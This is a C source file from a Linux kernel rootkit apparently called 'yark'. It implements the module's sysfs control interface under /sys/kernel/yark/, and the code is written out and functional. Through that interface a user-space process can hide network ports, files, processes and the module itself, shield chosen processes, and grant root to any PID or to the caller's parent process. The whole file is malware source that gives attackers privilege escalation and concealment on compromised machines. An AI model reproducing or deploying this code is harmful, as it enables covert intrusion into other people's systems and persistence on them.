#include <linux/fs.h>
#include <linux/hashtable.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/sysfs.h>
#include <linux/types.h>

#include "command.h"
#include "hide_file.h"
#include "hide_port.h"
#include "main.h"
#include "give_root.h"
#include "hide_module.h"
#include "hide_proc.h"
#include "protect_proc.h"

/**
 * This file provides a interface to for user-space process to communicate with
 * the yark kernel module running in kernel-space. The interface is based on
 * sysfs, by creating a new directory `/sys/kernel/yark/`.
 *
 * For things about sysfs, see:
 * https://www.kernel.org/doc/Documentation/filesystems/sysfs.txt
 */

// TODO: We can obfuscate the this path name at compile time:
#define SYS_DIR_NAME "yark"

/* attribute for hide_port */

static ssize_t hide_port_kobj_list(struct kobject *kobj,
                                   struct kobj_attribute *attr, char *buf) {
    size_t remain_size = PAGE_SIZE;
    size_t offset = 0;
    int count;
    struct hide_port_info *cur;

    cur = get_hide_port_info_list_head();
    cur = cur->next;
    while (cur != NULL) {
        if (remain_size <= 0)
            break;
        count = scnprintf(buf + offset, remain_size, "%d\n", cur->port);
        remain_size -= count;
        offset += count;
        cur = cur->next;
    }
    return offset;
}

static ssize_t hide_port_kobj_add(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    unsigned int port;
    int retval;

    retval = kstrtouint(buf, 10, &port);
    if (retval)
        return retval;
    retval = hide_port_add(port);
    if (retval < 0)
        return retval;
    return count;
}

static ssize_t hide_port_kobj_del(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    unsigned int port;
    int retval;

    retval = kstrtouint(buf, 10, &port);
    if (retval)
        return retval;
    retval = hide_port_del(port);
    if (retval < 0)
        return retval;
    return count;
}

static struct kobj_attribute hide_port_kobj_list_attribute =
    __ATTR(list, 0400, hide_port_kobj_list, NULL);
static struct kobj_attribute hide_port_kobj_add_attribute =
    __ATTR(add, 0200, NULL, hide_port_kobj_add);
static struct kobj_attribute hide_port_kobj_del_attribute =
    __ATTR(del, 0200, NULL, hide_port_kobj_del);

static struct attribute *hide_port_attrs[] = {
    &hide_port_kobj_list_attribute.attr, &hide_port_kobj_add_attribute.attr,
    &hide_port_kobj_del_attribute.attr, NULL};

static struct attribute_group hide_port_attr_group = {
    .name = "hide_port",
    .attrs = hide_port_attrs,
};

/* attribute for give_root */

static ssize_t give_root_kobj_giveme(struct kobject *kobj,
                                     struct kobj_attribute *attr, char *buf) {
    int retval;
    retval = give_root_by_process_pid(current->parent->pid);
    if (retval < 0)
        return retval;
    return 0;
}

static ssize_t give_root_kobj_give(struct kobject *kobj,
                                   struct kobj_attribute *attr, const char *buf,
                                   size_t count) {
    unsigned int pid;
    int retval;

    retval = kstrtouint(buf, 10, &pid);
    if (retval)
        return retval;

    retval = give_root_by_process_pid(pid);
    if (retval < 0)
        return retval;
    return count;
}

static struct kobj_attribute give_root_kobj_give_attribute =
    __ATTR(give, 0200, NULL, give_root_kobj_give);

static struct kobj_attribute give_root_kobj_giveme_attribute =
    __ATTR(giveme, 0444, give_root_kobj_giveme, NULL);

static struct attribute *give_root_attrs[] = {
    &give_root_kobj_give_attribute.attr, &give_root_kobj_giveme_attribute.attr,
    NULL};

static struct attribute_group give_root_attr_group = {
    .name = "give_root",
    .attrs = give_root_attrs,
};

/* attribute for hide_module */

static ssize_t hide_module_kobj_give_visibility(struct kobject *kobj,
                                                struct kobj_attribute *attr,
                                                const char *buf, size_t count) {
    unsigned int visibility;
    int retval;

    retval = kstrtouint(buf, 10, &visibility);
    if (retval)
        return retval;

    if (visibility == 0) {
        hide_module();
    } else if (visibility == 1) {
        show_module();
    }
    if (retval < 0)
        return retval;
    return count;
}

static struct kobj_attribute hide_module_kobj_visibility_attribute =
    __ATTR(vis, 0200, NULL, hide_module_kobj_give_visibility);

static struct attribute *hide_module_attrs[] = {
    &hide_module_kobj_visibility_attribute.attr, NULL};

static struct attribute_group hide_module_attr_group = {
    .name = "hide_module",
    .attrs = hide_module_attrs,
};

/* attribute for hide_file */

static ssize_t hide_file_kobj_list(struct kobject *kobj,
                                   struct kobj_attribute *attr, char *buf) {
    size_t remain_size = PAGE_SIZE;
    size_t offset = 0;
    int count;
    int bkt;
    struct hide_file_info *cur;

    hash_for_each(hide_file_info_list, bkt, cur, node) {
        if (remain_size <= 0)
            break;
        count = scnprintf(buf + offset, remain_size, "%s\n", cur->path.name);
        remain_size -= count;
        offset += count;
    }
    return offset;
}

static ssize_t hide_file_kobj_add(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    int retval;

    retval = hide_file_add(buf);
    if (retval < 0)
        return retval;
    return count;
}

static ssize_t hide_file_kobj_del(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    int retval;

    retval = hide_file_del(buf);
    if (retval < 0)
        return retval;
    return count;
}

static struct kobj_attribute hide_file_kobj_list_attribute =
    __ATTR(list, 0400, hide_file_kobj_list, NULL);
static struct kobj_attribute hide_file_kobj_add_attribute =
    __ATTR(add, 0200, NULL, hide_file_kobj_add);
static struct kobj_attribute hide_file_kobj_del_attribute =
    __ATTR(del, 0200, NULL, hide_file_kobj_del);

static struct attribute *hide_file_attrs[] = {
    &hide_file_kobj_list_attribute.attr, &hide_file_kobj_add_attribute.attr,
    &hide_file_kobj_del_attribute.attr, NULL};

static struct attribute_group hide_file_attr_group = {
    .name = "hide_file",
    .attrs = hide_file_attrs,
};

/* attribute for hide_proc */

static ssize_t hide_proc_kobj_list(struct kobject *kobj,
                                   struct kobj_attribute *attr, char *buf) {
    size_t remain_size = PAGE_SIZE;
    size_t offset = 0;
    int count;
    struct hide_proc_info *cur;

    cur = get_hide_proc_info_list_head();
    cur = cur->next;
    while (cur != NULL) {
        if (remain_size <= 0)
            break;
        count = scnprintf(buf + offset, remain_size, "%d\n", cur->pid);
        remain_size -= count;
        offset += count;
        cur = cur->next;
    }
    return offset;
}

static ssize_t hide_proc_kobj_add(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    pid_t pid;
    int retval;

    retval = kstrtouint(buf, 10, &pid);
    if (retval)
        return retval;
    retval = hide_proc_add(pid);
    if (retval < 0)
        return retval;
    return count;
}

static ssize_t hide_proc_kobj_del(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    pid_t pid;
    int retval;

    retval = kstrtouint(buf, 10, &pid);
    if (retval)
        return retval;
    retval = hide_proc_del(pid);
    if (retval < 0)
        return retval;
    return count;
}

static struct kobj_attribute hide_proc_kobj_list_attribute =
    __ATTR(list, 0400, hide_proc_kobj_list, NULL);
static struct kobj_attribute hide_proc_kobj_add_attribute =
    __ATTR(add, 0200, NULL, hide_proc_kobj_add);
static struct kobj_attribute hide_proc_kobj_del_attribute =
    __ATTR(del, 0200, NULL, hide_proc_kobj_del);

static struct attribute *hide_proc_attrs[] = {
    &hide_proc_kobj_list_attribute.attr, &hide_proc_kobj_add_attribute.attr,
    &hide_proc_kobj_del_attribute.attr, NULL};

static struct attribute_group hide_proc_attr_group = {
    .name = "hide_proc",
    .attrs = hide_proc_attrs,
};

/* attribute for protect_proc */

static ssize_t protect_proc_kobj_list(struct kobject *kobj,
                                   struct kobj_attribute *attr, char *buf) {
    size_t remain_size = PAGE_SIZE;
    size_t offset = 0;
    int count;
    struct protect_proc_info *pos;
    list_for_each_entry(pos,&protect_proc_info_list,list) {
        if (remain_size <= 0)
            break;
        count = scnprintf(buf + offset, remain_size, "%d\n", pos->pid);
        remain_size -= count;
        offset += count;
    }
    return offset;
}

static ssize_t protect_proc_kobj_add(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    pid_t pid;
    int retval;

    retval = kstrtouint(buf, 10, &pid);
    if (retval)
        return retval;
    retval = protect_proc_add(pid);
    if (retval < 0)
        return retval;
    return count;
}

static ssize_t protect_proc_kobj_del(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    pid_t pid;
    int retval;

    retval = kstrtouint(buf, 10, &pid);
    if (retval)
        return retval;
    retval = protect_proc_del(pid);
    if (retval < 0)
        return retval;
    return count;
}

static struct kobj_attribute protect_proc_kobj_list_attribute =
    __ATTR(list, 0400, protect_proc_kobj_list, NULL);
static struct kobj_attribute protect_proc_kobj_add_attribute =
    __ATTR(add, 0200, NULL, protect_proc_kobj_add);
static struct kobj_attribute protect_proc_kobj_del_attribute =
    __ATTR(del, 0200, NULL, protect_proc_kobj_del);

static struct attribute *protect_proc_attrs[] = {
    &protect_proc_kobj_list_attribute.attr, &protect_proc_kobj_add_attribute.attr,
    &protect_proc_kobj_del_attribute.attr, NULL};

static struct attribute_group protect_proc_attr_group = {
    .name = "protect_proc",
    .attrs = protect_proc_attrs,
};


static struct kobject *module_kobj;

int command_start(void) {
    int retval = 0;

    pr_info(LOG_PREFIX "call command_start()\n");

    /* create /sys/kernel/${SYS_DIR_NAME}/ */
    module_kobj = kobject_create_and_add(SYS_DIR_NAME, kernel_kobj);
    if (!module_kobj)
        return -ENOMEM;
    /* create /sys/kernel/${SYS_DIR_NAME}/hide_port/ */
    retval = sysfs_create_group(module_kobj, &hide_port_attr_group);
    if (retval)
        goto failed;
    /* create /sys/kernel/${SYS_DIR_NAME}/give_root/ */
    retval = sysfs_create_group(module_kobj, &give_root_attr_group);
    if (retval)
        goto failed;
    /* create /sys/kernel/${SYS_DIR_NAME}/hide_module/ */
    retval = sysfs_create_group(module_kobj, &hide_module_attr_group);
    if (retval)
        goto failed;
    /* create /sys/kernel/${SYS_DIR_NAME}/hide_file/ */
    retval = sysfs_create_group(module_kobj, &hide_file_attr_group);
    if (retval)
        goto failed;
    /* create /sys/kernel/${SYS_DIR_NAME}/hide_proc/ */
    retval = sysfs_create_group(module_kobj, &hide_proc_attr_group);
    if (retval)
        goto failed;
    /* create /sys/kernel/${SYS_DIR_NAME}/protect_proc/ */
    retval = sysfs_create_group(module_kobj, &protect_proc_attr_group);
    if (retval)
        goto failed;
    return retval;
failed:
    kobject_put(module_kobj);
    return retval;
}

void command_end(void) {
    pr_info(LOG_PREFIX "call command_end()\n");
    if (module_kobj)
        /* release module_kobj */
        kobject_put(module_kobj);
}
